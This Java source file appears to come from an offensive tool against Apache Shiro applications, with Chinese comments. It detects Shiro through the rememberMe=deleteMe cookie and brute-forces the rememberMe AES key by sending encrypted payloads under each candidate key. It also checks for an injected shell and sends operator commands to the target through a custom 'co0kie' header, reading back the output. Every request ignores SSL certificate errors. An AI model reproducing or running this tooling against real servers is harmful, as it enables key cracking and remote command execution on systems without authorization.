package common;

import entity.ControllersFactory;
import ui.MyController;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class HttpUtils {

    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;

    // 探测的时候检测 rememberMe=delteMe 的数量
    public boolean shiroDetectRequest(String method,String url) throws Exception {
        this.myController.result.appendText("[+] 目标地址: " + url + "\n");
        // 修改特征头
        String rememberMe = paramContext.get("rememberMe");
        String demoCookie = rememberMe+"=xxx";   // 探测用的 rememberMe
//        String demoCookie = "JSESSIONID=140424b7-bffb-44dd-9460-3042aa54ba56";
        Map<String,List<String>> header = null;
        List<String> setCookie = null;
        if (method.equals("GET")){
            header = this.sendGetRequest(url,demoCookie);
        } else if (method.equals("POST")){
            header = this.sendPostRequest(url,demoCookie,null);
        }
        if (header != null) {
            setCookie = header.get("Set-Cookie");
            if (setCookie != null && setCookie.toString().contains("=deleteMe")){
                // 如果返回头中有多个 deleteme
                if (setCookie.size() > 1){
                    int index = 0;
                    for (String value:setCookie){
                        if (value.contains("=deleteMe")){
                            index +=1;
                        }
                    }
                    paramContext.put("Index", String.valueOf(index));
                }

                this.myController.result.appendText("[+] 检测到 Shiro 框架\n");
                return true;
            } else {
                this.myController.result.appendText("[!] 未检测到 Shiro 框架\n");
                return false;
            }
        } else {
            this.myController.result.appendText("[!] 没有发现 Header 头\n");
            return false;
        }
    }

    public boolean shiroKeyBruteRequest(String method,String url,String key) throws Exception{
        String rememberMe = paramContext.get("rememberMe");
        Map<String,List<String>> header = null;
        List<String> setCookie = null;
        String detectCookie = null;
        String encryptType = this.paramContext.get("Encrypt");
        // 这里做一个判断来区分是 gcm 的还是 aes cbc 的
        if (encryptType.equals("CBC")){
            detectCookie = rememberMe + "=" + PayloadEncrypt.AesCbcEncrypt(CommonUtils.getDetectText(),key);
        } else{
            detectCookie = rememberMe + "=" + PayloadEncrypt.AesGcmEncrypt(CommonUtils.getDetectText(),key);
        }

        if (method.equals("GET")){
            header = this.sendGetRequest(url,detectCookie);
        } else {
            header = this.sendPostRequest(url,detectCookie,null);
        }

        // 输出模式的情况下输出 payload
        if (paramContext.get("OutputType").equals("1")){
            this.myController.result.appendText("\nPayload输出模式:");
            this.myController.result.appendText("\nKey: " + key + "\nCookie: " + detectCookie + "\n\n");
        }

        int index = 0;
        if (paramContext.get("Index") != null){
            index = Integer.parseInt(paramContext.get("Index"));
        }

        if (header != null){
            setCookie = header.get("Set-Cookie");
            // 判断deleteme 的数量
            if (setCookie != null && index > 1){
                if (setCookie.size() >= 1){
                    int size = 0;
                    for (String value:setCookie){
                        if (value.contains("=deleteMe")){
                            size +=1;
                        }
                    }
                    if (size < index){
                        this.myController.result.appendText("[+] 密钥为: " + key + "\n\n");
                        return true;
                    }
                }
            }

            if (setCookie == null || !setCookie.toString().contains("=deleteMe")){
                this.myController.result.appendText("[+] 密钥为: " + key + "\n\n");
                return true;
            }
        } else {
            this.myController.result.appendText("[!] 没有获取到 Header 头,有可能频率过快导致连接断开 \n");
            return false;
        }
        return false;
    }

    public Map<String,List<String>> sendCheckInject(String url, String cookie, String password) throws Exception{
        // 忽略 ssl 证书报错
        SslUtils.ignoreSsl();
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        if (ControllersFactory.currentProxy.get("Proxy") != null){
            Proxy proxy = ControllersFactory.currentProxy.get("Proxy");
            httpURLConnection = (HttpURLConnection) u.openConnection(proxy);
        }else {
            httpURLConnection = (HttpURLConnection) u.openConnection();
        }
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setConnectTimeout(5);
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        httpURLConnection.setRequestProperty("Connection", "close");
        if (cookie != null){
            httpURLConnection.addRequestProperty("Cookie",cookie);
        }
        if (ControllersFactory.paramsContext.get("CustomHeader") != null){
            for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                httpURLConnection.setRequestProperty(String.valueOf(entry.getKey()),String.valueOf(entry.getValue()));
            }
        }
        httpURLConnection.setRequestProperty("pass", password);
        Map<String, List<String>> header = httpURLConnection.getHeaderFields();
        return header;
    }

    // Java get 发包
    public Map<String,List<String>> sendGetRequest(String url, String cookie) throws Exception{
        Map<String,String> myProxy = new HashMap<>();
        Map<String, List<String>> header = null;
        // 忽略 ssl 证书报错
        SslUtils.ignoreSsl();
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        try {
            if (ControllersFactory.currentProxy.get("Proxy") != null){
                Proxy proxy = ControllersFactory.currentProxy.get("Proxy");
                httpURLConnection = (HttpURLConnection) u.openConnection(proxy);
            }else {
                httpURLConnection = (HttpURLConnection) u.openConnection();
            }
            httpURLConnection.setRequestMethod("GET");
            httpURLConnection.setConnectTimeout(5);
            httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
            httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
            httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
            httpURLConnection.setRequestProperty("Connection", "close");
            if (cookie != null){
                httpURLConnection.addRequestProperty("Cookie",cookie);
            }
            if (ControllersFactory.paramsContext.get("CustomHeader") != null){
                for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                    httpURLConnection.setRequestProperty(String.valueOf(entry.getKey()),String.valueOf(entry.getValue()));
                }
            }
            header = httpURLConnection.getHeaderFields();
            return header;
        } catch (Exception e){
            return header;
        }
    }

    // java post 发包
    public Map<String,List<String>> sendPostRequest(String url,String cookie,String postData) throws Exception {
        Map<String,String> myProxy = new HashMap<>();
        Map<String,List<String>> header = null;
        String param = null;
        if (postData == null){
            param = this.paramContext.get("PostParam");
        } else {
            param = postData;
        }
        // 忽略 ssl 证书报错
        SslUtils.ignoreSsl();
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        try {
            if (ControllersFactory.currentProxy.get("Proxy") != null){
                Proxy proxy = ControllersFactory.currentProxy.get("Proxy");
                httpURLConnection = (HttpURLConnection) u.openConnection(proxy);
            }else {
                httpURLConnection = (HttpURLConnection) u.openConnection();
            }
            httpURLConnection.setRequestMethod("POST");
            if (ControllersFactory.paramsContext.get("CustomHeader") == null){
                httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
                httpURLConnection.setRequestProperty("content-type",this.paramContext.get("ContentType"));
                httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
                httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
                httpURLConnection.setRequestProperty("Connection", "close");
                if (cookie != null){
                    httpURLConnection.addRequestProperty("Cookie",cookie);
                }
            }else {
                for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                    httpURLConnection.setRequestProperty(String.valueOf(entry.getKey()),String.valueOf(entry.getValue()));
                }
            }
            httpURLConnection.setConnectTimeout(5);
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setDoInput(true);

            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(param.getBytes());
            outputStream.flush();
            outputStream.close();
            // 获取返回头信息
            header = httpURLConnection.getHeaderFields();
            return header;
        } catch (Exception e){
            return header;
        }
    }


    public String getGetRequestResponse(String url, String cookie,String cmd) throws Exception{
        Map<String,String> myProxy = new HashMap<>();
        // 忽略 ssl 证书报错
        SslUtils.ignoreSsl();
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);

        if (ControllersFactory.currentProxy.get("Proxy") != null){
            Proxy proxy = ControllersFactory.currentProxy.get("Proxy");
            httpURLConnection = (HttpURLConnection) u.openConnection(proxy);
        }else {
            httpURLConnection = (HttpURLConnection) u.openConnection();
        }
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setConnectTimeout(5);
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        if (cmd != null){
            httpURLConnection.setRequestProperty("co0kie",cmd);
        }
        httpURLConnection.setRequestProperty("Connection", "close");
        if (cookie != null){
            httpURLConnection.addRequestProperty("Cookie",cookie);
        }
        if (ControllersFactory.paramsContext.get("CustomHeader") != null){
            for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                httpURLConnection.setRequestProperty(String.valueOf(entry.getKey()),String.valueOf(entry.getValue()));
            }
        }
        InputStream inputStream = httpURLConnection.getInputStream();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line = null;
        String resp = "";
        while ((line=bufferedReader.readLine()) != null){
            resp += line;
            resp += "\n";
        }
        return resp;
    }

    // java post 发包
    public String getPostRequestResponse(String url,String cookie,String cmd) throws Exception {
        Map<String,String> myProxy = new HashMap<>();
        String param = this.paramContext.get("PostParam");
        // 忽略 ssl 证书报错
        SslUtils.ignoreSsl();
        HttpURLConnection httpURLConnection = null;
        HttpURLConnection.setFollowRedirects(false);
        URL u = new URL(url);
        if (ControllersFactory.currentProxy.get("Proxy") != null){
//            myProxy = CommonUtils.normalProxy(paramContext);
//            Proxy proxy = new Proxy(Proxy.Type.HTTP,new InetSocketAddress(myProxy.get("host"),Integer.valueOf(myProxy.get("port"))));
            Proxy proxy = ControllersFactory.currentProxy.get("Proxy");
            httpURLConnection = (HttpURLConnection) u.openConnection(proxy);
        }else {
            httpURLConnection = (HttpURLConnection) u.openConnection();
        }
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36");
        httpURLConnection.setRequestProperty("content-type",this.paramContext.get("ContentType"));
        httpURLConnection.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        httpURLConnection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        httpURLConnection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
        if (cmd != null){
            httpURLConnection.setRequestProperty("co0kie",cmd);
        }
        httpURLConnection.setRequestProperty("Connection", "close");
        if (cookie != null){
            httpURLConnection.addRequestProperty("Cookie",cookie);
        }
        if (ControllersFactory.paramsContext.get("CustomHeader") != null){
            for (Map.Entry entry:ControllersFactory.currentHeader.entrySet()){
                httpURLConnection.setRequestProperty(String.valueOf(entry.getKey()),String.valueOf(entry.getValue()));
            }
        }
        httpURLConnection.setConnectTimeout(5);
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        OutputStream outputStream = httpURLConnection.getOutputStream();
        outputStream.write(param.getBytes());
        outputStream.flush();
        outputStream.close();

        InputStream inputStream = httpURLConnection.getInputStream();
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
        String line = null;
        String resp = "";
        while ((line=bufferedReader.readLine()) != null){
            resp += line;
            resp += "\n";
        }
        return resp;
    }

}
